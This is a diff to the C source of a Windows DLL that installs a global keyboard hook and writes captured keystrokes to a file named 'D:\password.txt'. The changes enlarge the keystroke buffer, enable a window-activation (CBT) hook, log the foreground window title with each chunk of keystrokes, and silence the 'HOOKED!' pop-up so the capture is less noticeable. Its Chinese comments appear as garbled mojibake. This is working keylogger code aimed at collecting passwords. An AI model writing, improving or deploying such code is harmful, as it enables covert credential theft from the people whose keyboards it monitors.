@@ -3,20 +3,23 @@
 #include "stdafx.h"
 #include "KDLL.h"
 
-#define	CHARNUM		5
-#define	TXTLENGTH	10
+#define	CHARNUM		16
+#define	TXTLENGTH	16
 #define	LOGDIR	"D:\\password.txt"
 
-extern HINSTANCE hInst;
+extern	HINSTANCE hInst;
 static	BOOL	bHooked = FALSE;
 static	BOOL	isActived = FALSE;
-static	HHOOK	hKBHook = 0, hhookMsg = 0;
+static	HHOOK	hKBHook = 0;
+static	HHOOK	hCBTHook = 0;
 
-int count;
-static char	tomb[CHARNUM];
-static FILE *stream;
-static int shift = 32;
-short  flag;
+int		count;
+static	char	tomb[CHARNUM];
+static	char winTitle[MAX_PATH];
+
+static  FILE *stream;
+static	int shift = 32;
+short	flag;
 
 enum NUM	//Ã¶¾Ù¼¸¸öÌØÊâ¹¦ÄÜ¼ü
 {
@@ -63,33 +66,34 @@ void _stdcall fnSetKbHook(void)
 			return;
 		}
 
-		//// ´°¿Ú²Ù×÷µÄ¹³×Ó ×î´ó»¯ ×îÐ¡»¯ ¹Ø±ÕµÈ
-		//if (!(hhookMsg = SetWindowsHookEx(WH_CBT, (HOOKPROC)CBTProc, hInst, (DWORD)NULL)))
-		//{
-		//	printf("hook CBT FAILED!");
-		//	MessageBox(NULL, L"Failed to install  CBT hook!", L"Error", MB_ICONERROR);
-		//	return;
-		//}
+		// ´°¿Ú²Ù×÷µÄ¹³×Ó ×î´ó»¯ ×îÐ¡»¯ ¹Ø±ÕµÈ
+		if (!(hCBTHook = SetWindowsHookEx(WH_CBT, (HOOKPROC)CBTProc, hInst, (DWORD)NULL)))
+		{
+			printf("hook CBT FAILED!");
+			MessageBox(NULL, L"Failed to install  CBT hook!", L"Error", MB_ICONERROR);
+			return;
+		}
 
-
+	    
 		bHooked = TRUE; //ÉèÖÃ±êÖ¾Î»
 		
-		MessageBox(GetDesktopWindow(), L"HOOKED!", L"info", MB_OK);
+		//MessageBox(GetDesktopWindow(), L"HOOKED!", L"info", MB_OK);
 	}
 }
 
 void _stdcall fnRemoveKbHook(void)
 {
+
 	if (bHooked)
 	{
-		if (UnhookWindowsHookEx(hKBHook))
+		if (!(UnhookWindowsHookEx(hKBHook) && UnhookWindowsHookEx(hCBTHook)))
 		{
-			MessageBox(GetDesktopWindow(), L"UNHOOKED!", L"info", MB_OK);
+			MessageBox(GetDesktopWindow(), L"UNHOOK FAILED!", L"warning", MB_ICONERROR);
 		}
 	}
 	else
 	{
-		MessageBox(GetDesktopWindow(), L"UNHOOKED!", L"info", MB_ICONERROR);
+		MessageBox(GetDesktopWindow(), L"Not Hook yet!", L"info", MB_ICONERROR);
 	}
 }
 // log »ØÐ´º¯Êý
@@ -152,6 +156,10 @@ void syncLog()
 			break;
 		}
 	}
+	
+	fprintf(stream, "%c", '\n');
+	fprintf(stream, "%s", winTitle);
+	fprintf(stream, "%c", '\n');
 	fclose(stream);
 }
 
@@ -212,6 +220,8 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 				}
 			if (count == CHARNUM)
 			{
+				HWND hforeground = GetForegroundWindow();
+				GetWindowTextA(hforeground, winTitle, MAX_PATH);
 				syncLog();
 				count = 0;
 				initCondition();
@@ -236,7 +246,7 @@ LRESULT CALLBACK CBTProc(int code, WPARAM wParam, LPARAM lParam) //´°¿Ú¼ì²âµÄ¹³×
 	/*Ä¿µÄÊµÏÖ¼ì²âÖ¸¶¨´°¿Ú£¬ÔÚ´°¿ÚÃû»ñÈ¡ÓÐµãÐ¡ÎÊÌâ*/
 	char textA[TXTLENGTH];
 
-	if (code == HCBT_ACTIVATE)	// HCBT_ACTIVATE ÏµÍ³×Ô´øµÄ×´Ì¬Âë
+	if (0/*code == HCBT_ACTIVATE*/)	// HCBT_ACTIVATE ÏµÍ³×Ô´øµÄ×´Ì¬Âë
 	{
 		GetClassName((HWND)wParam, text, TXTLENGTH);
 		GetWindowTextA((HWND)wParam, textA, TXTLENGTH);
@@ -255,5 +265,5 @@ LRESULT CALLBACK CBTProc(int code, WPARAM wParam, LPARAM lParam) //´°¿Ú¼ì²âµÄ¹³×
 		//MessageBox(GetDesktopWindow(), text, L"info", NULL);
 	}
 
-	return CallNextHookEx(hhookMsg, code, wParam, lParam); //´«µÝÏûÏ¢ ·ñÔòÎÞ·¨¹Ø±Õ´°¿Ú
+	return CallNextHookEx(hCBTHook, code, wParam, lParam); //´«µÝÏûÏ¢ ·ñÔòÎÞ·¨¹Ø±Õ´°¿Ú
 }
